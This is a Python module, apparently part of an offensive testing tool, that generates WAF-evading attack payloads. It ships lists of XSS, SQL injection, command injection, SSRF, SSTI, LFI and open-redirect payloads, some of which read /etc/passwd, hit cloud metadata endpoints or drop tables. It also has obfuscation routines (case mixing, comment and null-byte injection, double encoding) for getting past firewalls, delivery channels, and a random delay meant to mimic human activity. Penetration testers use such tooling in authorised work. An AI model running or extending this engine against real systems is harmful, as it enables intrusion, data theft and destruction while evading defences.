"""
WAF Bypass Engine - WAF绕过Payload生成引擎
支持XSS、SQL注入、SSRF等攻击向量的编码混淆与变异
"""
import random
import base64
import urllib.parse
import logging
from typing import List, Optional, Dict, Any, Callable
from enum import Enum

logger = logging.getLogger("strixpro.waf_bypass")


class EncodingMethod(Enum):
    URL = "url"
    DOUBLE_URL = "double_url"
    BASE64 = "base64"
    UNICODE = "unicode"
    HEX = "hex"
    MIXED_CASE = "mixed_case"
    TAB_INJECTION = "tab_injection"
    COMMENT_INJECTION = "comment_injection"
    NULL_BYTE = "null_byte"
    UTF_16 = "utf_16"
    HTML_ENTITY = "html_entity"
    JS_UNICODE = "js_unicode"


class AttackType(Enum):
    XSS = "xss"
    SQLI = "sqli"
    SSTI = "ssti"
    SSRF = "ssrf"
    LFI = "lfi"
    CMDI = "cmdi"
    OPEN_REDIRECT = "open_redirect"


# ============ Payload 模板库 ============

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "\"-alert(1)-\"",
    "'-alert(1)-'",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<body onload=alert(1)>",
    "<select autofocus onfocus=alert(1)>",
    "<textarea autofocus onfocus=alert(1)>",
    "<keygen autofocus onfocus=alert(1)>",
    "<video><source onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<isindex type=image src=1 onerror=alert(1)>",
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "' AND SLEEP(5)--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "admin'--",
    "admin' #",
    "' OR '1'='1' --",
    "')) OR 1=1--",
    "1; DROP TABLE users--",
    "' UNION SELECT @@version--",
    "' UNION SELECT database()--",
    "1' AND (SELECT * FROM users) = 1--",
    "1' AND extractvalue(1,concat(0x7e,database()))--",
    "1' AND updatexml(1,concat(0x7e,user()),1)--",
]

CMDI_PAYLOADS = [
    "; id",
    "| id",
    "|| id",
    "`id`",
    "$(id)",
    "; cat /etc/passwd",
    "| whoami",
    "|| ping -c 10 127.0.0.1",
    "& whoami &",
    "'; id; '",
]

SSRF_PAYLOADS = [
    "http://127.0.0.1:80",
    "http://localhost:80",
    "http://[::1]:80",
    "http://0.0.0.0:80",
    "file:///etc/passwd",
    "dict://127.0.0.1:6379",
    "gopher://127.0.0.1:6379/_",
    "http://169.254.169.254/latest/meta-data/",
]

PAYLOAD_TEMPLATES = {
    AttackType.XSS: XSS_PAYLOADS,
    AttackType.SQLI: SQLI_PAYLOADS,
    AttackType.CMDI: CMDI_PAYLOADS,
    AttackType.SSRF: SSRF_PAYLOADS,
    AttackType.SSTI: [
        "{{7*7}}",
        "${{7*7}}",
        "#{7*7}",
        "<%= 7*7 %>",
        "${7*7}",
        "{{config}}",
        "{{self}}",
        "{{''.__class__.__mro__}}",
    ],
    AttackType.LFI: [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "php://filter/convert.base64-encode/resource=index.php",
    ],
    AttackType.OPEN_REDIRECT: [
        "//evil.com",
        "https://evil.com",
        "//evil.com@good.com",
        "https://evil.com.good.com",
        "/\\evil.com",
    ],
}


class WAFBypassEngine:
    """WAF绕过引擎 - 智能生成绕过WAF的payload"""

    def __init__(self):
        self._encoding_funcs: Dict[EncodingMethod, Callable] = {
            EncodingMethod.URL: self._url_encode,
            EncodingMethod.DOUBLE_URL: self._double_url_encode,
            EncodingMethod.BASE64: self._base64_encode,
            EncodingMethod.UNICODE: self._unicode_encode,
            EncodingMethod.HEX: self._hex_encode,
            EncodingMethod.MIXED_CASE: self._mixed_case,
            EncodingMethod.TAB_INJECTION: self._tab_inject,
            EncodingMethod.COMMENT_INJECTION: self._comment_inject,
            EncodingMethod.NULL_BYTE: self._null_byte_inject,
            EncodingMethod.HTML_ENTITY: self._html_entity_encode,
            EncodingMethod.JS_UNICODE: self._js_unicode_encode,
        }

    def generate(
        self,
        attack_type: AttackType,
        count: int = 10,
        encodings: Optional[List[EncodingMethod]] = None,
    ) -> List[Dict[str, Any]]:
        """生成绕过payload"""
        templates = PAYLOAD_TEMPLATES.get(attack_type, [])
        if not templates:
            return []

        if encodings is None:
            encodings = list(EncodingMethod)

        results = []
        for i in range(count):
            template = random.choice(templates)
            encoding = random.choice(encodings)

            if encoding == EncodingMethod.MIXED_CASE:
                payload = self._mixed_case(template, skip_keywords=["alert", "onerror", "onload"])
            else:
                func = self._encoding_funcs.get(encoding, self._url_encode)
                payload = func(template)

            results.append({
                "id": f"pyl-{i+1:04d}",
                "original": template,
                "encoded": payload,
                "encoding": encoding.value,
                "attack_type": attack_type.value,
                "length": len(payload),
            })

        return results

    def mutate(self, payload: str, methods: Optional[List[EncodingMethod]] = None) -> List[str]:
        """对单个payload进行多重变异"""
        if methods is None:
            methods = [EncodingMethod.URL, EncodingMethod.MIXED_CASE, EncodingMethod.TAB_INJECTION]
        results = [payload]
        for method in methods:
            func = self._encoding_funcs.get(method)
            if func:
                try:
                    results.append(func(payload))
                except Exception:
                    continue
        return results

    # ============ 编码方法 ============

    def _url_encode(self, s: str) -> str:
        return urllib.parse.quote(s, safe='')

    def _double_url_encode(self, s: str) -> str:
        first = urllib.parse.quote(s, safe='')
        return urllib.parse.quote(first, safe='')

    def _base64_encode(self, s: str) -> str:
        return base64.b64encode(s.encode()).decode()

    def _unicode_encode(self, s: str) -> str:
        result = []
        for c in s:
            if c.isalnum():
                result.append(f"\\u{ord(c):04x}")
            else:
                result.append(c)
        return "".join(result)

    def _hex_encode(self, s: str) -> str:
        # 对非字母数字字符进行hex编码
        result = []
        for c in s:
            if c.isalnum() or c in " '\"":
                result.append(c)
            else:
                result.append(f"%{ord(c):02x}")
        return "".join(result)

    def _mixed_case(self, s: str, skip_keywords: Optional[List[str]] = None) -> str:
        """大小写随机混合"""
        if skip_keywords is None:
            skip_keywords = []
        result = []
        i = 0
        while i < len(s):
            matched = False
            for kw in skip_keywords:
                if s[i:i+len(kw)].lower() == kw.lower():
                    result.append(kw)
                    i += len(kw)
                    matched = True
                    break
            if matched:
                continue
            result.append(random.choice([s[i].upper(), s[i].lower()]))
            i += 1
        return "".join(result)

    def _tab_inject(self, s: str) -> str:
        """在关键字间插入TAB"""
        result = []
        for i, c in enumerate(s):
            result.append(c)
            # 在单词中间随机插入\t
            if c.isalpha() and i < len(s) - 1 and s[i+1].isalpha():
                if random.random() < 0.3:
                    result.append("\t")
        return "".join(result)

    def _comment_inject(self, s: str) -> str:
        """在SQL关键字间插入注释"""
        result = []
        i = 0
        keywords = ["OR", "AND", "UNION", "SELECT", "WHERE", "FROM", "SLEEP", "DROP"]
        while i < len(s):
            matched = False
            for kw in keywords:
                if s[i:i+len(kw)].upper() == kw:
                    comment = random.choice(["/**/", "/*!*/", "/*00000*/"])
                    result.append(kw[0])
                    result.append(comment)
                    result.append(kw[1:])
                    i += len(kw)
                    matched = True
                    break
            if matched:
                continue
            result.append(s[i])
            i += 1
        return "".join(result)

    def _null_byte_inject(self, s: str) -> str:
        """注入空字节"""
        result = []
        for c in s:
            result.append(c)
            if random.random() < 0.15:
                result.append("%00")
        return "".join(result)

    def _html_entity_encode(self, s: str) -> str:
        result = []
        for c in s:
            if c in "<>'\"&":
                ord_val = ord(c)
                result.append(f"&#{ord_val};")
            else:
                result.append(c)
        return "".join(result)

    def _js_unicode_encode(self, s: str) -> str:
        result = []
        for c in s:
            if not c.isalnum():
                result.append(f"\\u{ord(c):04x}")
            else:
                result.append(c)
        return "".join(result)


class PayloadDelivery:
    """Payload投递策略"""

    @staticmethod
    def get_methods() -> List[Dict[str, str]]:
        return [
            {"id": "get", "name": "GET参数", "desc": "通过URL查询参数投递"},
            {"id": "post", "name": "POST表单", "desc": "通过POST表单数据投递"},
            {"id": "json", "name": "JSON Body", "desc": "通过JSON请求体投递"},
            {"id": "header", "name": "HTTP头", "desc": "通过HTTP头投递（如X-Forwarded-For）"},
            {"id": "cookie", "name": "Cookie", "desc": "通过Cookie投递"},
            {"id": "multipart", "name": "Multipart", "desc": "通过multipart/form-data投递"},
            {"id": "websocket", "name": "WebSocket", "desc": "通过WebSocket消息投递"},
        ]

    @staticmethod
    def random_delay(min_ms: int = 500, max_ms: int = 3000) -> float:
        """生成随机延迟，模拟人类操作"""
        import time
        delay = random.uniform(min_ms / 1000, max_ms / 1000)
        time.sleep(delay)
        return delay


# 全局引擎
engine = WAFBypassEngine()
